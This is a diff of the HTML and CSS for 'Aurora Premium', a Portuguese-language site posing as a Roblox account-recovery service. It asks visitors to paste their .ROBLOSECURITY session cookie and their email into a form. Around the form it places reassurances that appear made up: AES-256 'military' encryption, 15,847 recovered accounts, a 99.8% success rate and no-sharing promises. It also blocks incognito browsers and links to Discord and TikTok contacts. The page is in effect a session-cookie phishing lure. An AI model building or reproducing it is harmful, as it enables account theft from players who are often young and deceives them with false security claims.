+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            padding: 1.5rem;
+        }
+
+        .terms-modal-overlay.active {
+            display: flex;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .terms-modal-content {
+            background: linear-gradient(135deg, rgba(10, 26, 10, 0.98), rgba(26, 42, 26, 0.98));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 700px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+            animation: scaleIn 0.4s ease-out;
+        }
+
+        .terms-modal-content h2 {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 800;
+            font-family: 'Poppins', sans-serif;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .terms-modal-content h3 {
+            color: #fedc00;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin: 1.5rem 0 0.8rem;
+        }
+
+        .terms-modal-content p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.9rem;
+            line-height: 1.8;
+            margin-bottom: 0.8rem;
+        }
+
+        .terms-modal-content ul {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.9rem;
+            line-height: 1.8;
+            padding-left: 1.5rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .terms-modal-content ul li {
+            margin-bottom: 0.3rem;
+        }
+
+        .terms-modal-content .terms-actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .terms-modal-content .terms-actions .btn {
+            flex: 1;
+            min-width: 120px;
+        }
+
+        .terms-modal-content .terms-actions .btn-secondary-modal {
+            background: rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.7);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .terms-modal-content .terms-actions .btn-secondary-modal:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .terms-modal-content .terms-actions .btn-primary-modal {
+            background: linear-gradient(135deg, #009739, #00802e);
+            color: white;
+        }
+
+        .terms-modal-content .terms-actions .btn-primary-modal:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.4);
+        }
+
+        .terms-close-btn {
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            float: right;
+        }
+
+        .terms-close-btn:hover {
+            color: #ef4444;
+            transform: rotate(90deg);
+        }
+
+        /* ===== DONATION SECTION ===== */
+        .donation-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .donation-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 16px;
+            padding: 1.8rem;
+            text-align: center;
+            transition: all 0.4s ease;
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .donation-card::after {
+            content: '🔒';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 1rem;
+            opacity: 0.5;
+        }
+
+        .donation-card.desativado {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        .donation-card.desativado::before {
+            content: '⏳ EM BREVE';
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            font-weight: 900;
+            color: #fedc00;
+            z-index: 10;
+            border-radius: 16px;
+        }
+
+        .donation-card:nth-child(1) { animation-delay: 0.1s; }
+        .donation-card:nth-child(2) { animation-delay: 0.2s; }
+        .donation-card:nth-child(3) { animation-delay: 0.3s; }
+        .donation-card:nth-child(4) { animation-delay: 0.4s; }
+
+        .donation-card:hover:not(.desativado) {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
+            border-color: rgba(0, 151, 57, 0.3);
+            transform: translateY(-8px);
+        }
+
+        .donation-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #009739, #fedc00);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            color: #012169;
+            margin: 0 auto 1.2rem;
+            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .donation-card:hover:not(.desativado) .donation-icon {
+            transform: scale(1.1) rotate(10deg);
+        }
+
+        .donation-card h3 {
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .donation-desc {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .btn-secondary {
+            background: rgba(0, 151, 57, 0.15);
+            color: #fedc00;
+            border: 1.5px solid rgba(0, 151, 57, 0.4);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            width: 100%;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(0, 151, 57, 0.25);
+            border-color: rgba(0, 151, 57, 0.6);
+            transform: translateY(-3px);
+            color: #ffd700;
+        }
+
+        .btn-secondary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background: rgba(10, 26, 10, 0.95);
+            border-top: 2px solid rgba(254, 220, 0, 0.1);
+            padding: 3rem 0 1.5rem;
+            margin-top: 4rem;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+        }
+
+        .footer-content {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer-section h4 {
+            color: white;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            font-size: 1rem;
+        }
+
+        .footer-section p,
+        .footer-section a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            font-size: 0.85rem;
+            line-height: 1.8;
+            transition: all 0.3s ease;
+        }
+
+        .footer-section a:hover {
+            color: #fedc00;
+            padding-left: 0.3rem;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(254, 220, 0, 0.1);
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.8rem;
+        }
+
+        .footer-bottom i {
+            color: #009739;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .footer-bottom .gold {
+            color: #fedc00;
+        }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 1.5rem;
+            display: none;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .processing-modal,
+        .success-modal {
+            background: linear-gradient(135deg, rgba(10, 26, 10, 0.95), rgba(26, 42, 26, 0.95));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            animation: scaleIn 0.4s ease-out;
+        }
+
+        .loader {
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(0, 151, 57, 0.2);
+            border-top: 4px solid #fedc00;
+            border-radius: 50%;
+            margin: 0 auto 1.5rem;
+            animation: spin 1s linear infinite;
+        }
+
+        .processing-title {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 0.5rem;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .processing-message {
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+        }
+
+        .progress-container {
+            margin-bottom: 1.5rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 0.5rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #009739, #fedc00);
+            border-radius: 10px;
+            animation: progressFill 3s ease-out forwards;
+        }
+
+        .progress-text {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, rgba(0, 151, 57, 0.2), rgba(0, 151, 57, 0.05));
+            border: 2px solid rgba(0, 151, 57, 0.4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            font-size: 2.5rem;
+            color: #00b84a;
+            animation: bounceIn 0.6s ease-out;
+        }
+
+        .success-title {
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 0.8rem;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .success-message {
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+            font-size: 0.9rem;
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #009739, #00802e);
+            color: white;
+            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            width: 100%;
+        }
+
+        .btn-success:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 151, 57, 0.5);
+        }
+
+        /* ===== BLOQUEIO DE ACESSO ===== */
+        .block-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 1.5rem;
+        }
+
+        .block-modal-overlay.active {
+            display: flex;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .block-modal-content {
+            background: linear-gradient(135deg, rgba(10, 26, 10, 0.98), rgba(26, 42, 26, 0.98));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 2px solid rgba(239, 68, 68, 0.4);
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            animation: scaleIn 0.4s ease-out;
+        }
+
+        .block-modal-content .block-icon {
+            font-size: 4rem;
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .block-modal-content h2 {
+            color: #ef4444;
+            font-size: 1.5rem;
+            font-weight: 800;
+            font-family: 'Poppins', sans-serif;
+            margin-bottom: 0.8rem;
+        }
+
+        .block-modal-content p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.95rem;
+            line-height: 1.7;
+            margin-bottom: 0.8rem;
+        }
+
+        .block-modal-content .block-reason {
+            background: rgba(239, 68, 68, 0.1);
+            border-radius: 12px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(239, 68, 68, 0.2);
+        }
+
+        .block-modal-content .block-reason p {
+            color: #fca5a5;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin: 0;
+        }
+
+        .block-modal-content .btn-retry {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            border: none;
+            padding: 0.9rem 2rem;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .block-modal-content .btn-retry:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.4);
+        }
+
+        /* ===== RESPONSIVO ===== */
+        @media (max-width: 1024px) {
+            .recovery-grid { grid-template-columns: 1fr; }
+            .main-card { padding: 1.5rem; }
+            .container { padding: 0 1.2rem; }
+        }
+
+        @media (max-width: 768px) {
+            .nav-menu {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: rgba(10, 26, 10, 0.98);
+                backdrop-filter: blur(20px);
+                -webkit-backdrop-filter: blur(20px);
+                padding: 1rem 1.5rem;
+                gap: 0.3rem;
+                border-bottom: 2px solid rgba(254, 220, 0, 0.1);
+                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            }
+
+            .nav-menu.open { display: flex; }
+            .nav-link { padding: 0.6rem 0.5rem; font-size: 0.9rem; width: 100%; }
+            .nav-toggle { display: block; }
+
+            .section { padding: 1.5rem 0; min-height: auto; }
+            .main-card { padding: 1.2rem; }
+
+            .card-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.8rem;
+            }
+
+            .card-header h1 { font-size: 1.3rem; }
+            .container { padding: 0 0.8rem; }
+
+            .cards-grid,
+            .faq-grid,
+            .stats-grid,
+            .donation-grid,
+            .comunidade-grid {
+                grid-template-columns: 1fr;
+                gap: 1rem;
+            }
+
+            .hero-title { font-size: 2rem; }
+            .section-title { font-size: 1.6rem; }
+            .footer-content { grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+            .block-message .timer { font-size: 1.5rem; }
+
+            .terms-modal-content {
+                padding: 1.5rem;
+                max-height: 90vh;
+            }
+
+            .terms-modal-content h2 { font-size: 1.2rem; }
+        }
+
+        @media (max-width: 480px) {
+            .section { padding: 1rem 0; }
+            .main-card { padding: 1rem; }
+            .card-header h1 { font-size: 1.1rem; }
+            .form-label { font-size: 0.8rem; }
+            .form-input { padding: 0.8rem; font-size: 0.9rem; }
+            .btn { padding: 0.8rem 1.5rem; font-size: 0.9rem; }
+            .sidebar { gap: 1rem; }
+            .info-card { padding: 1.2rem; }
+            .hero-title { font-size: 1.6rem; }
+            .section-title { font-size: 1.3rem; }
+            .footer-content { grid-template-columns: 1fr; gap: 1.5rem; }
+            .processing-modal,
+            .success-modal { padding: 1.5rem; }
+            .block-message .timer { font-size: 1.2rem; }
+
+            .terms-modal-content {
+                padding: 1.2rem;
+            }
+
+            .terms-modal-content .terms-actions {
+                flex-direction: column;
+            }
+
+            .terms-modal-content .terms-actions .btn {
+                width: 100%;
+            }
+
+            .block-modal-content {
+                padding: 1.5rem;
+            }
+
+            .block-modal-content h2 { font-size: 1.2rem; }
+        }
+    </style>
 </head>
 <body>
-    <div class="background-glow"></div>
-    
-    <div class="container" id="app">
-        <!-- Tela Principal -->
-        <div id="main-screen">
-            <header>
-                <h1 class="logo">AURORA</h1>
-                <p class="subtitle">Conecte sua conta de forma segura e rápida.</p>
-            </header>
+    <!-- ===== FUNDO ANIMADO ===== -->
+    <div class="animated-bg">
+        <div class="stars"></div>
+        <div class="glow-orb glow-1"></div>
+        <div class="glow-orb glow-2"></div>
+        <div class="glow-orb glow-3"></div>
+    </div>
 
-            <main class="glass-card">
-                <div class="input-group">
-                    <label for="cookie">Insira o seu Cookie (.ROBLOSECURITY)</label>
-                    <input type="text" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
-                </div>
+    <!-- ===== TERMS & PRIVACY MODAL ===== -->
+    <div class="terms-modal-overlay" id="termsModal">
+        <div class="terms-modal-content">
+            <button class="terms-close-btn" onclick="closeTermsModal()">
+                <i class="fas fa-times"></i>
+            </button>
+            <h2>🇧🇷 Termos de Serviço & Política de Privacidade</h2>
+            
+            <h3>1. Termos de Serviço</h3>
+            <p>Ao utilizar a plataforma Aurora Premium, você concorda com os seguintes termos:</p>
+            <ul>
+                <li><strong>1.1</strong> A Aurora Premium é uma ferramenta de recuperação de contas que atua como intermediária entre o usuário e a plataforma Roblox.</li>
+                <li><strong>1.2</strong> Não nos responsabilizamos pelo mau uso da ferramenta. O usuário é o único responsável por suas ações.</li>
+                <li><strong>1.3</strong> A recuperação de contas é um processo que depende de fatores externos e pode não ser 100% garantido.</li>
+                <li><strong>1.4</strong> O usuário declara ser o legítimo proprietário da conta que está tentando recuperar.</li>
+                <li><strong>1.5</strong> A Aurora Premium não se responsabiliza por qualquer dano, perda ou prejuízo causado pelo uso da ferramenta.</li>
+            </ul>
 
-                <button id="send-btn" class="main-button">
-                    Vincular Conta
-                </button>
+            <h3>2. Política de Privacidade</h3>
+            <p>Valorizamos sua privacidade e protegemos seus dados:</p>
+            <ul>
+                <li><strong>2.1</strong> Coletamos apenas as informações necessárias para o processo de recuperação (cookie e email).</li>
+                <li><strong>2.2</strong> Seus dados são criptografados com AES-256 durante a transmissão.</li>
+                <li><strong>2.3</strong> Não armazenamos seus dados permanentemente em nossos servidores.</li>
+                <li><strong>2.4</strong> Não compartilhamos suas informações com terceiros.</li>
+                <li><strong>2.5</strong> O cookie fornecido é usado exclusivamente para o processo de recuperação.</li>
+                <li><strong>2.6</strong> Você tem o direito de solicitar a exclusão de seus dados a qualquer momento.</li>
+            </ul>
 
-                <p class="disclaimer">Ao prosseguir, você concorda com os termos de processamento de dados do Aurora.</p>
-            </main>
-        </div>
+            <h3>3. Isenção de Responsabilidade</h3>
+            <p>A Aurora Premium é uma ferramenta independente e não é afiliada, endossada ou patrocinada pela Roblox Corporation. A recuperação de contas está sujeita às políticas e termos de serviço da Roblox. Não garantimos a recuperação bem-sucedida de todas as contas, pois cada caso é único e depende de diversos fatores.</p>
 
-        <!-- Tela de Recuperação -->
-        <div id="recovery-screen" style="display: none;">
-            <header>
-                <h1 class="logo">AURORA</h1>
-                <p class="subtitle">Recuperação de Conta</p>
-            </header>
+            <h3>4. Aceitação dos Termos</h3>
+            <p>Ao clicar em "Aceito e Concordo", você declara que leu, entendeu e concorda com todos os termos e condições descritos acima. Caso não concorde com algum dos termos, recomendamos que não utilize a plataforma.</p>
 
-            <main class="glass-card">
-                <div class="warning-icon">⚠️</div>
-                <h2 class="recovery-title">Conta Detectada!</h2>
-                <p class="recovery-text">Sua conta foi identificada no nosso sistema de recuperação.</p>
-                
-                <button id="recover-btn" class="main-button recover-button">
-                    Recuperar Conta Agora
-                </button>
-            </main>
-        </div>
-
-        <!-- Tela de Processamento -->
-        <div id="processing-screen" style="display: none;">
-            <header>
-                <h1 class="logo">AURORA</h1>
-                <p class="subtitle">Processando solicitação...</p>
-            </header>
-
-            <main class="glass-card">
-                <div class="loader"></div>
-                <h2 class="processing-title">Aguarde</h2>
-                <p class="processing-text" id="processing-message">Processando sua solicitação...</p>
-                <div class="progress-bar">
-                    <div class="progress-fill"></div>
-                </div>
-            </main>
+            <div class="terms-actions">
+                <button class="btn btn-secondary-modal" onclick="closeTermsModal()">❌ Recusar</button>
+                <button class="btn btn-primary-modal" onclick="acceptTerms()">✅ Aceito e Concordo</button>
+            </div>
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <!-- ===== BLOQUEIO DE ANÔNIMO ===== -->
+    <div class="block-modal-overlay" id="blockModal">
+        <div class="block-modal-content">
+            <div class="block-icon">🚫</div>
+            <h2>Acesso Bloqueado!</h2>
+            <p>Detectamos que você está usando:</p>
+            <div class="block-reason">
+                <p id="blockReason">🔒 Navegador Anônimo Detectado</p>
+            </div>
+            <p>Por questões de segurança, o acesso através de <strong style="color:#fca5a5;">navegadores anônimos</strong> não é permitido.</p>
+            <br>
+            <p style="font-size:0.85rem; color:rgba(255,255,255,0.5);">Desative o modo anônimo para acessar a plataforma.</p>
+            <button class="btn-retry" onclick="window.location.reload()">
+                <i class="fas fa-sync-alt"></i> Tentar Novamente
+            </button>
+        </div>
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo" onclick="showSection('home')">
+                <i class="fas fa-star"></i>
+                <span>AURORA PREMIUM</span>
+            </div>
+            <div class="nav-menu" id="navMenu">
+                <a class="nav-link active" onclick="showSection('home')"><i class="fas fa-home"></i> Home</a>
+                <a class="nav-link" onclick="showSection('recovery')"><i class="fas fa-sync-alt"></i> Recuperar</a>
+                <a class="nav-link" onclick="showSection('comunidade')"><i class="fas fa-users"></i> Comunidade</a>
+                <a class="nav-link" onclick="showSection('faq')"><i class="fas fa-question-circle"></i> FAQ</a>
+                <a class="nav-link" onclick="showSection('stats')"><i class="fas fa-chart-bar"></i> Stats</a>
+                <a class="nav-link" onclick="showSection('donate')"><i class="fas fa-heart"></i> Doar</a>
+            </div>
+            <button class="nav-toggle" onclick="toggleMenu()">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+    </nav>
+
+    <!-- ===== HOME SECTION ===== -->
+    <section class="section active" id="home">
+        <div class="container">
+            <div class="hero-content">
+                <div class="hero-badge">
+                    <i class="fas fa-crown"></i>
+                    🏆 HexaVem! 🇧🇷
+                </div>
+                <h1 class="hero-title">Aurora Premium</h1>
+                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="hexa">🏆 HEXAVEM!</span></p>
+                <p class="hero-description">
+                    Recupere sua conta Roblox de forma segura, rápida e confiável com nossa plataforma de última geração. 
+                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#fedc00;">#HexaVem</strong>
+                </p>
+                <div class="hero-features">
+                    <div class="feature-badge"><i class="fas fa-shield-alt"></i> 100% Seguro</div>
+                    <div class="feature-badge"><i class="fas fa-bolt"></i> Ultrarrápido</div>
+                    <div class="feature-badge"><i class="fas fa-check-circle"></i> Verificado</div>
+                    <div class="feature-badge"><i class="fas fa-trophy"></i> #HexaVem</div>
+                </div>
+                <div class="hero-cta">
+                    <button class="btn btn-primary btn-lg" onclick="showSection('recovery')">
+                        <i class="fas fa-arrow-right"></i> Começar Agora
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- CARDS SECTION -->
+        <div class="cards-section">
+            <div class="container">
+                <h2 class="section-title">Por que Escolher Aurora? 🇧🇷</h2>
+                <p class="section-subtitle">Recursos que fazem a diferença</p>
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card-icon"><i class="fas fa-rocket"></i></div>
+                        <h3 class="card-title">Rápido</h3>
+                        <p class="card-text">Processamento em tempo real com tecnologia de ponta. Recupere sua conta em minutos.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon"><i class="fas fa-lock"></i></div>
+                        <h3 class="card-title">Seguro</h3>
+                        <p class="card-text">Criptografia de nível militar para seus dados. Privacidade garantida sempre.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon"><i class="fas fa-headset"></i></div>
+                        <h3 class="card-title">Suporte 24/7</h3>
+                        <p class="card-text">Equipe sempre pronta para ajudar você. Respostas em menos de 1 hora.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon"><i class="fas fa-trophy"></i></div>
+                        <h3 class="card-title">HexaVem!</h3>
+                        <p class="card-text">Junte-se à torcida do hexa! A energia da seleção brasileira está conosco.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== RECOVERY SECTION ===== -->
+    <section class="section" id="recovery">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">Dashboard de Recuperação</h2>
+                <p class="section-subtitle">Recupere sua conta de forma segura e confiável 🇧🇷</p>
+                
+                <div class="recovery-grid">
+                    <div class="main-card">
+                        <div class="card-header">
+                            <h1>Recuperar Sua Conta</h1>
+                            <span class="badge">🏆 HexaVem</span>
+                        </div>
+
+                        <form id="recoveryForm" onsubmit="handleSubmit(event)">
+                            <div class="form-group">
+                                <label class="form-label">
+                                    <i class="fas fa-key"></i> Cookie (.ROBLOSECURITY)
+                                </label>
+                                <div class="input-wrapper">
+                                    <input type="password" id="cookieInput" class="form-input" placeholder="Cole seu cookie seguro aqui..." autocomplete="off" required>
+                                    <button type="button" class="toggle-btn" onclick="togglePassword()">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                </div>
+                                <small class="form-hint">Seu cookie nunca será compartilhado ou armazenado permanentemente</small>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">
+                                    <i class="fas fa-envelope"></i> Email da Conta
+                                </label>
+                                <div class="input-wrapper">
+                                    <input type="email" id="emailInput" class="form-input" placeholder="seu.email@exemplo.com" required>
+                                </div>
+                                <small class="form-hint">Confirme o email associado à sua conta</small>
+                            </div>
+
+                            <div class="security-box">
+                                <i class="fas fa-shield-alt"></i>
+                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#fedc00;">🇧🇷 #HexaVem</span></p>
+                            </div>
+
+                            <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
+                                <i class="fas fa-lock-open"></i> Iniciar Recuperação
+                            </button>
+
+                            <div class="block-message" id="blockMessage">
+                                <i class="fas fa-clock"></i>
+                                <h3>⏳ Aguarde!</h3>
+                                <p>Você já utilizou sua única tentativa. Aguarde <strong>9 horas</strong> para tentar novamente.</p>
+                                <div class="timer" id="timerDisplay">9h 00m 00s</div>
+                                <p style="font-size:0.8rem;margin-top:0.5rem;">🔒 Navegador anônimo bloqueado</p>
+                                <div style="margin-top: 1rem; display: flex; flex-direction: column; gap: 0.5rem; align-items: center;">
+                                    <p style="color: rgba(255,255,255,0.6); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
+                                    <div style="display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;">
+                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #fedc00; text-decoration: none; font-size: 0.85rem; background: rgba(0,151,57,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(0,151,57,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
+                                            <i class="fab fa-discord"></i> Discord
+                                        </a>
+                                        <a href="https://www.tiktok.com/@244brobt" target="_blank" style="color: #25f4ee; text-decoration: none; font-size: 0.85rem; background: rgba(0,0,0,0.3); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(37,244,238,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
+                                            <i class="fab fa-tiktok"></i> TikTok Suporte
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <p class="disclaimer">
+                                ✓ Ao prosseguir, você concorda com nossos <a href="#" onclick="openTermsModal(); return false;">termos de serviço</a> e <a href="#" onclick="openTermsModal(); return false;">política de privacidade</a>.
+                            </p>
+                        </form>
+                    </div>
+
+                    <div class="sidebar">
+                        <div class="info-card">
+                            <h4><i class="fas fa-server"></i> Status do Sistema</h4>
+                            <div style="margin-bottom: 0.8rem;">
+                                <span class="status-indicator"><i class="fas fa-circle"></i> Online 🇧🇷</span>
+                            </div>
+                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #00b84a; font-weight: 700;">✓ Operacional</span></div>
+                            <div class="info-item"><span class="info-label">API</span><span style="color: #00b84a; font-weight: 700;">✓ Funcionando</span></div>
+                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #00b84a; font-weight: 700;">✓ Protegido</span></div>
+                        </div>
+
+                        <div class="info-card">
+                            <h4><i class="fas fa-chart-line"></i> Estatísticas</h4>
+                            <div class="info-item"><span class="info-label">Contas Recuperadas</span><span class="info-value">15,847</span></div>
+                            <div class="info-item"><span class="info-label">Taxa de Sucesso</span><span class="info-value">99.8%</span></div>
+                            <div class="info-item"><span class="info-label">Tempo Médio</span><span class="info-value">2h 30m</span></div>
+                            <div class="info-item"><span class="info-label">Torcida</span><span class="info-value">🏆 HexaVem!</span></div>
+                        </div>
+
+                        <div class="info-card">
+                            <h4><i class="fas fa-star"></i> Recursos Premium</h4>
+                            <ul class="features-list">
+                                <li><i class="fas fa-check"></i> Recuperação Rápida</li>
+                                <li><i class="fas fa-check"></i> Suporte Prioritário</li>
+                                <li><i class="fas fa-check"></i> Verificação 2FA</li>
+                                <li><i class="fas fa-check"></i> Histórico Completo</li>
+                                <li><i class="fas fa-check"></i> Backup Automático</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== COMUNIDADE SECTION ===== -->
+    <section class="section" id="comunidade">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">👥 Nossa Comunidade 🇧🇷</h2>
+                <p class="section-subtitle">Conecte-se conosco e faça parte da família Aurora</p>
+                
+                <div class="comunidade-grid">
+                    <div class="comunidade-card" onclick="window.open('https://discord.gg/ztskdZZjEs', '_blank')">
+                        <div class="comunidade-icon discord"><i class="fab fa-discord"></i></div>
+                        <h3>Discord</h3>
+                        <p>Entre no nosso servidor para suporte rápido, novidades e interagir com a comunidade.</p>
+                        <button class="btn-comunidade"><i class="fab fa-discord"></i> Entrar no Discord</button>
+                    </div>
+
+                    <div class="comunidade-card">
+                        <div class="comunidade-icon email"><i class="fas fa-envelope"></i></div>
+                        <h3>Email Oficial</h3>
+                        <p>Entre em contato conosco pelo email oficial para suporte e dúvidas.</p>
+                        <div class="email-info">
+                            <p><i class="fas fa-envelope"></i> suporte.auroraplum@gmail.com</p>
+                        </div>
+                        <button class="btn-comunidade" onclick="window.location.href='mailto:suporte.auroraplum@gmail.com'">
+                            <i class="fas fa-paper-plane"></i> Enviar Email
+                        </button>
+                    </div>
+
+                    <div class="comunidade-card" onclick="window.open('https://www.tiktok.com/@244brobt', '_blank')">
+                        <div class="comunidade-icon tiktok"><i class="fab fa-tiktok"></i></div>
